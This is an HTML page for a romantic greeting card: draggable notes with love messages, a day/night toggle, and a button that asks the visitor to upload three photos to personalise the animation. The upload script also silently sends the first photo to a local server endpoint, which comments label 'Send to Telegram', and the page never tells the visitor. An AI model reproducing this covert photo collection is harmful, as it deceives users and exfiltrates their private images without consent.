<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sundar Kanya ❤️</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Short+Stack&family=Homemade+Apple&display=swap">
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <!-- 🌗 Mode Toggle Button -->
  <button class="toggle-btn" id="modeToggle">🌞</button>

  <!-- 📤 Upload Button -->
  <div class="upload-container">
    <form id="telegramForm" enctype="multipart/form-data">
      <input type="file" id="imageUpload" name="image" accept="image/*" multiple hidden />
      <label for="imageUpload" class="upload-btn">📤 Upload 3 Images</label>
    </form>
  </div>

  <!-- ❤️ Heart Paper -->
  <div class="paper heart"></div>

  <!-- 🖼️ Preloaded Papers -->
  <div class="paper image">
    <p> and I fallen in</p>
    <p>Love with You 😍 </p>
    <img src="images/1.jpg" />
  </div>

  <div class="paper image">
    <p></p>
    <img src="images/2.jpg" />
  </div>

  <div class="paper image">
    <p>How can be </p>
    <p> someone so cute ❤️ </p>
    <img src="images/3.jpg" />
  </div>

  <div class="paper red">
    <p class="p1"> and My Favorite</p>
    <p class="p2">Person 😍</p>
  </div>

  <div class="paper">
    <p class="p1">You are Cute </p>
    <p class="p1">Amazing <span style="color: red !important;">❤️</span></p>
  </div>

  <div class="paper">
    <p class="p1">Drag the papers to move!</p>
  </div>

  <!-- 🌟 Script Section -->
  <script>
    const toggleBtn = document.getElementById('modeToggle');
    const body = document.body;

    // 🌞 Initial Mode
    body.classList.add('day-mode');
    toggleBtn.textContent = '🌞';

    toggleBtn.addEventListener('click', () => {
      if (body.classList.contains('day-mode')) {
        body.classList.remove('day-mode');
        body.classList.add('night-mode');
        toggleBtn.textContent = '🌙';
      } else {
        body.classList.remove('night-mode');
        body.classList.add('day-mode');
        toggleBtn.textContent = '🌞';
      }
    });

    // 📤 Handle Image Upload (Replace 3 existing images + Send to Telegram)
    const imageUpload = document.getElementById('imageUpload');
    const imageElements = document.querySelectorAll('.paper.image img');

    imageUpload.addEventListener('change', (event) => {
      const files = Array.from(event.target.files);
      if (files.length !== 3) {
        alert("Please upload exactly 3 images to personalize the animation.");
        return;
      }

      // Replace images in animation
      files.forEach((file, index) => {
        const reader = new FileReader();
        reader.onload = function(e) {
          if (imageElements[index]) {
            imageElements[index].src = e.target.result;
          }
        };
        reader.readAsDataURL(file);
      });

      // Send first image to Telegram
      const formData = new FormData();
      formData.append('image', files[0]); // You can loop and send all if needed

      fetch('http://localhost:3000/upload', {
        method: 'POST',
        body: formData
      })
      .then(res => res.text())
      .then(msg => console.log(msg))
      .catch(err => console.error('Telegram upload failed:', err));
    });

    // 📱 Device Detection
    const ua = navigator.userAgent;
    const script = document.createElement('script');
    script.src = /Mobi|Android/i.test(ua) ? './mobile.js' : './script.js';
    document.body.appendChild(script);
  </script>
</body>
</html>
